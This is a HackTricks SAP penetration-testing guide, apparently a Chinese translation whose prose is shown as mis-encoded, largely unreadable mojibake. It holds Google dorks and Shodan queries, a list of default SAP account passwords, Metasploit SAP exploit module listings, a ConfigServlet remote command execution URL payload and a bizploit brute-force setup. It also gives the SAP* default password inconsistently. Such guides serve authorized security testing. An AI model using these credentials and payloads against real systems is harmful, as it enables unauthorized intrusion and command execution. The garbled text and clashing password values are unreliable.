<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“ **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# SAPç®€ä»‹

SAPä»£è¡¨ç³»ç»Ÿåº”ç”¨å’Œæ•°æ®å¤„ç†ä¸­çš„äº§å“ã€‚SAPæŒ‰å®šä¹‰ä¹Ÿæ˜¯ERPï¼ˆä¼ä¸šèµ„æºè§„åˆ’ï¼‰è½¯ä»¶çš„åç§°ä»¥åŠå…¬å¸çš„åç§°ã€‚
SAPç³»ç»Ÿç”±è®¸å¤šå®Œå…¨é›†æˆçš„æ¨¡å—ç»„æˆï¼Œå‡ ä¹æ¶µç›–äº†å•†ä¸šç®¡ç†çš„æ¯ä¸€ä¸ªæ–¹é¢ã€‚

æ¯ä¸ªSAPå®ä¾‹ï¼ˆæˆ–SIDï¼‰ç”±ä¸‰å±‚ç»„æˆï¼šæ•°æ®åº“ã€åº”ç”¨ç¨‹åºå’Œå±•ç¤ºå±‚ï¼‰ï¼Œæ¯ä¸ªæ™¯è§‚é€šå¸¸ç”±å››ä¸ªå®ä¾‹ç»„æˆï¼šå¼€å‘ã€æµ‹è¯•ã€QAå’Œç”Ÿäº§ã€‚
è¿™äº›å±‚ä¸­çš„æ¯ä¸€å±‚éƒ½å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šè¢«åˆ©ç”¨ï¼Œä½†é€šè¿‡**æ”»å‡»æ•°æ®åº“**å¯ä»¥è·å¾—æœ€å¤§æ•ˆæœã€‚

æ¯ä¸ªSAPå®ä¾‹è¢«åˆ’åˆ†ä¸ºå®¢æˆ·ç«¯ã€‚æ¯ä¸ªå®¢æˆ·ç«¯éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·SAP\*ï¼Œç›¸å½“äºåº”ç”¨ç¨‹åºçš„â€œrootâ€ã€‚
åœ¨æœ€åˆåˆ›å»ºæ—¶ï¼Œè¿™ä¸ªç”¨æˆ·SAP\*ä¼šæœ‰ä¸€ä¸ªé»˜è®¤å¯†ç ï¼šâ€œ060719992â€ï¼ˆä¸‹é¢è¿˜æœ‰æ›´å¤šé»˜è®¤å¯†ç ï¼‰ã€‚
å¦‚æœæ‚¨çŸ¥é“åœ¨æµ‹è¯•æˆ–å¼€å‘ç¯å¢ƒä¸­è¿™äº›**å¯†ç å¤šä¹…æ²¡æœ‰æ›´æ”¹è¿‡**ï¼Œæ‚¨ä¼šæ„Ÿåˆ°æƒŠè®¶çš„ï¼

å°è¯•ä½¿ç”¨ç”¨æˆ·å&lt;SID&gt;admè·å–ä»»ä½•æœåŠ¡å™¨çš„shellè®¿é—®æƒé™ã€‚
æš´åŠ›ç ´è§£å¯ä»¥å¸®åŠ©ï¼Œä½†å¯èƒ½å­˜åœ¨è´¦æˆ·é”å®šæœºåˆ¶ã€‚

# å‘ç°

> ä¸‹ä¸€èŠ‚å†…å®¹ä¸»è¦æ¥è‡ªç”¨æˆ·shipcod3çš„[https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)ï¼

* æ£€æŸ¥æµ‹è¯•çš„åº”ç”¨ç¨‹åºèŒƒå›´æˆ–ç¨‹åºç®€ä»‹ã€‚æ³¨æ„ç”¨äºè¿æ¥SAP GUIçš„ä¸»æœºåæˆ–ç³»ç»Ÿå®ä¾‹ã€‚
* ä½¿ç”¨OSINTï¼ˆå¼€æºæƒ…æŠ¥ï¼‰ã€Shodanå’ŒGoogle Dorksæ£€æŸ¥æ–‡ä»¶ã€å­åŸŸå’Œæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå¦‚æœåº”ç”¨ç¨‹åºé¢å‘äº’è”ç½‘æˆ–å…¬å¼€ï¼š
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
* è¿™æ˜¯ [http://SAP:50000/irj/portal](http://sap:50000/irj/portal) çš„æ ·å­

![SAP ç™»å½•å±å¹•](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

* ä½¿ç”¨ nmap æ£€æŸ¥å¼€æ”¾ç«¯å£å’Œå·²çŸ¥æœåŠ¡ï¼ˆsap routers, webdynpro, web services, web servers ç­‰ï¼‰ã€‚
* å¦‚æœæœ‰ web æœåŠ¡å™¨åœ¨è¿è¡Œï¼Œçˆ¬å– URLsã€‚
* å¦‚æœåœ¨æŸäº›ç«¯å£ä¸Šæœ‰ web æœåŠ¡å™¨ï¼Œå¯¹ç›®å½•è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ˆä½ å¯ä»¥ä½¿ç”¨ Burp Intruderï¼‰ã€‚ä»¥ä¸‹æ˜¯ SecLists é¡¹ç›®æä¾›çš„ä¸€äº›å¥½çš„è¯è¡¨ï¼Œç”¨äºæŸ¥æ‰¾é»˜è®¤çš„ SAP ICM è·¯å¾„ä»¥åŠå…¶ä»–æœ‰è¶£çš„ç›®å½•æˆ–æ–‡ä»¶ï¼š

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls\_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

* ä½¿ç”¨ Metasploit çš„ SAP SERVICE DISCOVERY è¾…åŠ©æ¨¡å—æ¥æšä¸¾ SAP å®ä¾‹/æœåŠ¡/ç»„ä»¶ï¼š
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## æµ‹è¯•åšå®¢æˆ·ç«¯ / SAP GUI

ä»¥ä¸‹æ˜¯è¿æ¥åˆ°SAP GUIçš„å‘½ä»¤
`sapgui <sap server hostname> <system number>`

* æ£€æŸ¥é»˜è®¤å‡­æ® \(åœ¨Bugcrowdçš„æ¼æ´è¯„çº§åˆ†ç±»ä¸­ï¼Œè¿™è¢«è§†ä¸ºP1 -&gt; æœåŠ¡å™¨å®‰å…¨é…ç½®é”™è¯¯ \| ä½¿ç”¨é»˜è®¤å‡­æ® \| ç”Ÿäº§æœåŠ¡å™¨\)ï¼š
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
* è¿è¡ŒWiresharkï¼Œç„¶åä½¿ç”¨ä½ è·å–çš„å‡­è¯å¯¹å®¢æˆ·ç«¯ï¼ˆSAP GUIï¼‰è¿›è¡Œè®¤è¯ï¼Œå› ä¸ºä¸€äº›å®¢æˆ·ç«¯åœ¨æ²¡æœ‰SSLçš„æƒ…å†µä¸‹ä¼ è¾“å‡­è¯ã€‚æœ‰ä¸¤ä¸ªå·²çŸ¥çš„Wiresharkæ’ä»¶å¯ä»¥è§£æSAP DIAGåè®®ä¸»è¦å¤´éƒ¨ï¼šSecureAuth Labsçš„SAPè§£ææ’ä»¶å’ŒPositive Research Centerçš„SAP DIAGæ’ä»¶ã€‚
* æ£€æŸ¥æ˜¯å¦å­˜åœ¨æƒé™æå‡ï¼Œæ¯”å¦‚ä½¿ç”¨ä¸€äº›å¯¹ä½æƒé™ç”¨æˆ·çš„SAPäº‹åŠ¡ä»£ç ï¼ˆtcodesï¼‰ï¼š
  * SU01 - åˆ›å»ºå’Œç»´æŠ¤ç”¨æˆ·
  * SU01D - æ˜¾ç¤ºç”¨æˆ·
  * SU10 - æ‰¹é‡ç»´æŠ¤
  * SU02 - æ‰‹åŠ¨åˆ›å»ºé…ç½®æ–‡ä»¶
  * SM19 - å®‰å…¨å®¡è®¡ - é…ç½®
  * SE84 - SAP R/3æˆæƒä¿¡æ¯ç³»ç»Ÿ
* æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤/è¿è¡Œè„šæœ¬ã€‚
* æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨BAPI Explorerä¸Šæ‰§è¡ŒXSSæ”»å‡»ã€‚

# æµ‹è¯•Webç•Œé¢

* çˆ¬å–URLsï¼ˆå‚è§å‘ç°é˜¶æ®µï¼‰ã€‚
* åƒåœ¨å‘ç°é˜¶æ®µä¸€æ ·å¯¹URLsè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚è¿™æ˜¯[http://SAP:50000/index.html](http://sap:50000/index.html)çš„æ ·å­ï¼š

![SAP Index Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

* å¯»æ‰¾å¸¸è§çš„Webæ¼æ´ï¼ˆå‚è€ƒOWASPå‰10åï¼‰ï¼Œå› ä¸ºåœ¨æŸäº›åœ°æ–¹å­˜åœ¨XSSã€RCEã€XXEç­‰æ¼æ´ã€‚
* æŸ¥çœ‹Jason Haddixçš„[â€œThe Bug Hunters Methodologyâ€](https://github.com/jhaddix/tbhm)æ¥æµ‹è¯•Webæ¼æ´ã€‚
* é€šè¿‡åŠ¨è¯ç¯¡æ”¹å®ç°è®¤è¯ç»•è¿‡ï¼Ÿä¹Ÿè®¸å¯ä»¥ :)
* æ‰“å¼€`http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#`ï¼Œç„¶åç‚¹å‡»â€œé€‰æ‹©â€æŒ‰é’®ï¼Œåœ¨æ‰“å¼€çš„çª—å£ä¸­æŒ‰â€œæœç´¢â€ã€‚ä½ åº”è¯¥èƒ½çœ‹åˆ°ä¸€ä¸ªSAPç”¨æˆ·åˆ—è¡¨ï¼ˆæ¼æ´å‚è€ƒï¼š[ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/)ï¼‰
* å‡­è¯æ˜¯å¦é€šè¿‡HTTPæäº¤ï¼Ÿå¦‚æœæ˜¯ï¼Œæ ¹æ®Bugcrowdçš„[æ¼æ´è¯„çº§åˆ†ç±»](https://bugcrowd.com/vulnerability-rating-taxonomy)è¢«è®¤ä¸ºæ˜¯P3çº§åˆ«ï¼šè®¤è¯å’Œä¼šè¯ç®¡ç†ç ´å | é€šè¿‡HTTPçš„å¼±ç™»å½•åŠŸèƒ½ã€‚æç¤ºï¼šä¹Ÿæ£€æŸ¥[http://SAP:50000/startPage](http://sap:50000/startPage)æˆ–ç™»å½•é—¨æˆ· :)

![SAP Start Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

* å°è¯•è®¿é—®`/irj/go/km/navigation/`ï¼Œå¯èƒ½å­˜åœ¨ç›®å½•åˆ—è¡¨æˆ–è®¤è¯ç»•è¿‡
* [http://SAP/sap/public/info](http://sap/sap/public/info)åŒ…å«ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼š
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# æ”»å‡»ï¼

* æ£€æŸ¥å®ƒæ˜¯å¦è¿è¡Œåœ¨æ—§æœåŠ¡å™¨æˆ–åƒWindows 2000è¿™æ ·çš„æŠ€æœ¯ä¸Šã€‚
* è®¡åˆ’å¯èƒ½çš„æ¼æ´åˆ©ç”¨/æ”»å‡»ï¼ŒMetasploitæœ‰å¾ˆå¤šç”¨äºSAPå‘ç°ï¼ˆè¾…åŠ©æ¨¡å—ï¼‰å’Œæ¼æ´åˆ©ç”¨çš„æ¨¡å—ï¼š
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
* å°è¯•ä½¿ç”¨ä¸€äº›å·²çŸ¥çš„æ¼æ´ï¼ˆæŸ¥çœ‹ Exploit-DBï¼‰æˆ–åƒè€ä½†æœ‰æ•ˆçš„â€œSAP ConfigServlet è¿œç¨‹ä»£ç æ‰§è¡Œâ€æ”»å‡»åœ¨ SAP Portal ä¸­ï¼š
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

* åœ¨ Discovery é˜¶æ®µè¿è¡Œ bizploit è„šæœ¬çš„ `start` å‘½ä»¤ä¹‹å‰ï¼Œæ‚¨è¿˜å¯ä»¥æ·»åŠ ä»¥ä¸‹å†…å®¹ä»¥æ‰§è¡Œæ¼æ´è¯„ä¼°ï¼š
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# å…¶ä»–æœ‰ç”¨çš„æµ‹è¯•å·¥å…·

* [PowerSAP](https://github.com/airbus-seclab/powersap) - Powershell å·¥å…·è¯„ä¼° SAP å®‰å…¨æ€§
* [Burp Suite](https://portswigger.net/burp) - ç›®å½•æ¨¡ç³Šæµ‹è¯•å’Œç½‘ç»œå®‰å…¨è¯„ä¼°å¿…å¤‡
* [pysap](https://github.com/SecureAuthCorp/pysap) - Python åº“ï¼Œç”¨äºåˆ¶ä½œ SAP ç½‘ç»œåè®®æ•°æ®åŒ…
* [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - å¸®åŠ© nmap æ£€æµ‹ SAP/ERP

# å‚è€ƒèµ„æ–™

* [ä½¿ç”¨ Metasploit è¿›è¡Œ SAP æ¸—é€æµ‹è¯•](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
* [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - è„šæœ¬åŠè‡ªåŠ¨åŒ– Bizploit
* [SAP NetWeaver ABAP å®‰å…¨é…ç½®ç¬¬ 3 éƒ¨åˆ†ï¼šè®¿é—®åº”ç”¨ç¨‹åºçš„é»˜è®¤å¯†ç ](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
* [ä¸ SAP å®‰å…¨ç›¸å…³çš„ ABAP-äº‹åŠ¡ä»£ç åˆ—è¡¨](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
* [ç ´è§£ SAP é—¨æˆ·](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
* [SAP ä¸­æœ€æœ‰è¶£çš„å‰ 10 å¤§æ¼æ´å’Œæ”»å‡»](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
* [ä½¿ç”¨ bizploit è¯„ä¼° SAP ç”Ÿæ€ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼šå‘ç°](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
* [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
* [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
* [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
